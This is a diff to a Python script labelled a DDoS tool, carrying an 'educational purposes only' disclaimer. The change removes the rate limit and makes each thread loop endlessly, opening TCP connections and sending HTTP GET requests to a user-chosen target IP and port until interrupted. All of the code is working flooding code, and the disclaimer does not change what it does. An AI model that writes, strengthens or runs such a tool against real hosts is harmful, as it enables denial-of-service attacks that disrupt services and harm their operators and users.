@@ -1,12 +1,13 @@
-import  socket
-import  threading
-import  time
-import  argparse
-import  logging
+import socket
+import threading
+import time
+import argparse
+import logging
+import os
+import sys
 
 def display_banner():
     banner = r"""
-
     ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░
     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
@@ -15,30 +16,45 @@ def display_banner():
     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
     ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░
     """
-    os.system('clear' if os.name == 'posix' else 'cls')  # Clear the terminal screen
+    os.system('clear' if os.name == 'posix' else 'cls')
     print(banner)
 
-
-# Set up logging
+# Configure logging
 logging.basicConfig(filename='ddos.log', level=logging.INFO, format='%(asctime)s - %(message)s')
 
 def attack(target_ip, target_port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        s.connect((target_ip, target_port))
-        logging.info(f"Connected to {target_ip}:{target_port}")
-        s.close()
-    except socket.error as e:
-        logging.error(f"Error: {e}")
+    while True:  # Continuous attack until stopped
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(2)
+                s.connect((target_ip, target_port))
+                logging.info(f"Connected to {target_ip}:{target_port}")
+                # Send some data to keep connection open
+                s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
+                time.sleep(1)  # Maintain connection briefly
+        except Exception as e:
+            logging.error(f"Error: {e}")
+            time.sleep(0.5)
 
-def start_attack(target_ip, target_port, num_threads, rate_limit):
-    for _ in range(num_threads):
-        thread = threading.Thread(target=attack, args=(target_ip, target_port))
-        thread.start()
-        time.sleep(1 / rate_limit)
+def start_attack(target_ip, target_port, num_threads):
+    threads = []
+    try:
+        for _ in range(num_threads):
+            thread = threading.Thread(target=attack, args=(target_ip, target_port))
+            thread.daemon = True
+            thread.start()
+            threads.append(thread)
+        
+        # Keep main thread alive
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nAttack stopped by user.")
+        sys.exit(0)
 
 def main():
+    display_banner()
+
     print("""
     DISCLAIMER:
     This script is for educational purposes only. 
@@ -46,14 +62,22 @@ def main():
     The author is not responsible for any misuse of this script.
     """)
 
-    parser = argparse.ArgumentParser(description="DDOS Script for Educational Purposes")
-    parser.add_argument("target_ip", help="Target IP address")
-    parser.add_argument("target_port", type=int, help="Target port")
-    parser.add_argument("--threads", type=int, default=10, help="Number of threads")
-    parser.add_argument("--rate", type=int, default=5, help="Requests per second")
-    args = parser.parse_args()
+    try:
+        target_ip = input("Enter the target IP address: ")
+        target_port = int(input("Enter the target port: "))
+        num_threads = int(input("Enter the number of threads (default: 10): ") or 10)
 
-    start_attack(args.target_ip, args.target_port, args.threads, args.rate)
+        print(f"\nStarting attack on {target_ip}:{target_port} with {num_threads} threads...")
+        print("Press Ctrl+C to stop the attack\n")
+        
+        start_attack(target_ip, target_port, num_threads)
+
+    except ValueError:
+        print("Error: Invalid input! Please enter valid numbers for port and threads.")
+        sys.exit(1)
+    except Exception as e:
+        print(f"Unexpected error: {e}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
